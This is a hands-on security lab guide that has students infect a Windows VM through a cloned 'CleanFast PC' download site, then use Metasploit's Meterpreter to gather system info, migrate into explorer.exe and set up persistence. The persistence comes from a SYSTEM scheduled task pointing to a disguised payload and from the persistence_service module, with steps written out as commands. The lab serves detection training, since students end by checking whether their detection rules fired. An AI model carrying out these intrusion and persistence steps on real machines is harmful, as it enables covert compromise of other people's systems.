# Lab 1:2 - Pop Pop Pop

## Objective

*What will students achieve by the end of this lab?*

- Infect our Windows VM
- Validate established Meterpreter session
- Gather initial system info
- Migrate processes
- Setup persistence

---

## Estimated Time

*Approximate time to complete the lab.*

- Example: 25 minutes

---

# Step-by-Step Instructions

*The core of the lab. Include command blocks, expected outcomes, and notes.*

# Step 1: Infect our Windows VM

In our scenario, our Windows VM is experiencing performance problems and an administrator has been contacted to work on fixing the issue. The administrator logs in to fix the machine. Unknowing to him an attacker has bought ads that link back to their malicious cloned website of a popular PC repair tool. When the administrator searches for popular repair tools he gets lured into clicking a fake website and is going to download and install the tool thinking everything is normal.

1. Hope you remembered your Kali VM IP, if not run `ifconfig eth0` to get it again
2. On our Windows VM, open up Microsoft Edge and type the following address `http://<Kali VM IP>`
3. Our fake site is now loaded, click on the `Download CleanFast PC` button

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image.png)

![](https://media2.giphy.com/media/v1.Y2lkPTc5NDFmZGM2bHcxajBiMXd2bWF1bmtnYWZmNDI2NnFrYTAxZmpsa3pvY3NraTA5cCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/10Jpr9KSaXLchW/giphy.gif)

<aside>
💡

Our administrator has several other systems to service and is in a hurry and they click through the next several Windows warnings because they know what they are doing.

</aside>

1. Microsoft Edge download will prompt saying the download could be harmful, click on the `Keep` button

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%201.png)

1. Click on `Open file`

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%202.png)

1. Admin: “Yes yes Smart Screen we are in a hurry stop slowing me down”, click on `More info`

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%203.png)

1. Admin: “OMG Yeeeees run anyway!, come on …. eeeeh Windows!”, click on `Run anyway` 

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%204.png)

![](https://cdn.uconnectlabs.com/wp-content/uploads/sites/7/2017/03/8e76b6e622d5a87aae135e2ce261de51.gif?v=19926)

1. Boop and that's all she wrote folks. 

<aside>
💡

Keep in mind this is a lab and Windows Defender has been disabled to allow things to run more smoothly. Getting around EDRs now a days is a difficult task to accomplish and this does make it look really easy to do but it is not.

</aside>

# Step 2: Validate established Meterpreter session

1. Take a look at your Kali VM terminal Metasploit is running in, there should be a new session for you to interact with

Example of new session:

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%205.png)

<aside>
💡

If your session is dying it is possible, you may have a mix and matched your handler and shell payload especially if you might have adventured off and created other payloads. If this is the case see [Meterpreter Troubleshooting](Meterpreter%20Troubleshooting%2024f86e25cbe58029813bd0fc37f6637d.md) 

</aside>

1. Now that we have a session lets do something with it 😁

# Step 3: Gather initial system info

1. First we have to interact with the session by using the `sessions` command to list our active sessions. This tells us our shell type and some general information about the connecting machine.

Command:

```bash
sessions
```

1. Lets interact with our new session by issuing `sessions -i <Id>`

Command:

```bash
sessions -i <Id>
```

<aside>
💡

You don’t have to use `-i` you could just type `sessions <Id>`

</aside>

Example output

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%206.png)

1. Lets get a little bit more information about the machine we are connected to by using the following commands `sysinfo,` `getuid` and `ps` . These commands will give us an idea of the account we are using, the domain it is on which could let us know what company you are in and what are the running processes. Why do we want to know what processes are running? Well we want to have an idea what software is running (log collector agents, legacy software, EDRs, etc) and what are the associated users that are running it. Might be something we could pivot to or abuse.

Commands:

```bash
sysinfo
```

```bash
getuid
```

```bash
ps
```

Example output:

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%207.png)

## Step 4: Migrate processes

Let’s say our overworked Administrator didn’t log in with their own account (no, that never happens 😉) but instead used the user’s account to poke around and discovered our super-cool tool.

No problem. Remember those processes we listed earlier? Some of them might be running under accounts with higher privileges than our current one. By migrating into one of those processes, we can “level up” our privileges without needing to log in as that higher-privileged user directly.

<aside>
💡

 Our environment is not setup with other accounts we could migrate to, but still take the opportunity to migrate to another process. 

</aside>

Explorer.exe is always a nice one to migrate to since this is the process responsible for the user interface of Windows. When a user opens an application explorer.exe will be its parent process, so if we migrate to explorer.exe a lot of our actions will blend in and look like the user initialized them.

 

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%208.png)

1. Lets migrate to Explorer.exe using the `migrate` command. Find the pid associated to Explorer.exe by running `ps` and then run migrate to move to it.

```json
migrate <explorer.exe pid>
```

Example Output:

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%209.png)

Above screenshot shows what the current pid was with the `getpid` command and the command of `migrate` to move to the explorer.exe process pid.  

## Step 5: Setup persistence

Even though we are on the Windows VM, we can easily lose that connection so we need to add some fail safes to keep our persistence on this machine. We will setup two persistence mechanisms, one using a schedule task and the other by installing a service. 

### Schedule Task

Our schedule task will be setup to be ran on system startup, so if the machine is restarted our payload will make a callback to our handler (server). 

1. We are going to reuse our payload that we created with `msfvenom` that is located at `/home/kali/www.cleanfastpc.com/` and we are going to upload/rename the payload on the target machine to `c:\\Users\\Public\\CleanFastPCupdater.exe` . 
    
    ```powershell
    upload ~/www.cleanfastpc.com/cleanfastpc_setup.exe c:\\Users\\Public\\CleanFastPCupdater.exe
    ```
    
2. Then we going to perform creating the schedule task manually by drop down into a windows `shell` . Run the following command to drop into a Windows shell.
    
    ```powershell
    shell
    ```
    
3. After we drop into the Windows shell you are going to run the following command to create the schedule task that points to our uploaded payload.
    
    ```powershell
    schtasks /ru "SYSTEM" /RL HIGHEST /create /sc onstart /tn "CleanFastPCSvc" /tr "c:\users\public\cleanfastpcupdater.exe"
    ```
    
4. Since we have a Windows shell lets double check that our schedule task was created by running the following command to list out the schedule tasks and find the matching task name of CleanFastPCSvc
    
    ```powershell
    schtasks /query /fo LIST /v | findstr CleanFastPCSvc
    ```
    

Example Output:

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%2010.png)

### Service Install

Nice we now have our first persistence mechanism setup, but lets create our backup, to our backup to ensure our mission success. This time we are going to utilize a Metasploit module called `persistence_service`. This will create a service using your payload.

1. First we need to exit out of the Windows shell by running `exit` . This will bring you back to `meterpreter` prompt
    
    ```json
    exit
    ```
    
2. Now use the `background` command to keep your meterpreter session running and bring you to `msf6` prompt.

```bash
background 
```

<aside>
💡

The shorthand version of background command is bg

</aside>

1. Now lets use the `persistence_service` module. Run the following command
    
    ```json
    use exploit/windows/local/persistence_service
    ```
    
2. Now that Metasploit knows the module we are trying to configure lets set the port we want the the Meterpreter payload to callback on. We want to change the port so it doesn't conflict with our other handler listening on 4444 so lets set it to `4445` 
    
    ```json
    set LPORT 4445
    ```
    
3. You additionally have to set the session you want the module to interact with with setting the session. If you are not sure on the session number run the command `sessions` to list your active sessions. 
    
    ```json
    set SESSION <Id>
    ```
    
4. To execute this module we run the command `exploit` . When it runs it will start a new handler on port 4445, create the service on our established session target  and start the new service.
    
    ```json
    exploit
    ```
    

1. After it is done executing, your `msf6` prompt will switch to the new Meterpreter session.
    
    Example Output:
    
    ![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%2011.png)
    

1. Lets test if our persistence mechanism works, since we already have a shell on the Windows VM lets issue the `reboot` command to restart it.
    
    ```powershell
    reboot 
    ```
    

1. Once the VM starts back up our schedule task will execute our Meterpreter shell as SYSTEM

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%2012.png)

![](https://media0.giphy.com/media/v1.Y2lkPTc5NDFmZGM2ZmhjdGFzOGRveXo2MDQzeWh2ZXZ3Y2k1OGY0NWVrdXBiMW00aTduaCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/W0Vz7zDK7vgMBc2fpw/giphy.gif)

1. Check if your detection rules fired, remember I did say you might to have fix one 😉
    1. I believe in you that you can fix it with some experimenting and have some fun 🫠 
    2. HINT: You might have to run persistence_service a couple more times to catch variations, proceed with caution though. Ensure you `stop the service and kill the associated process` if you are going to run it several times. `You will end up locking up your VM if you don’t.`

---

## Next Steps

*What comes after this lab?*

- [Bonus Lab - Echo<Threat](/Labs/Bonus/Bonus%20Lab%20-%20Echo%20Threat.md)

<aside>
💡

If we are out of time and cant do the Bonus Lab above

</aside>

## Cleanup Instructions

*How to restore the lab environment.*

- Pivot over to MetaCTF and click on `Stop All Machines`

![image.png](Lab%201%202%20-%20Pop%20Pop%20Pop/image%2013.png)

---

## References

- [Metasploit & Meterpreter Cheat Sheet](Metasploit%20&%20Meterpreter%20Cheat%20Sheet.md)
- Metasploit: https://docs.metasploit.com/docs/using-metasploit/basics/
- Metepreter: https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html

 © 2026 DEATHGroup Labs LLC. All rights reserved.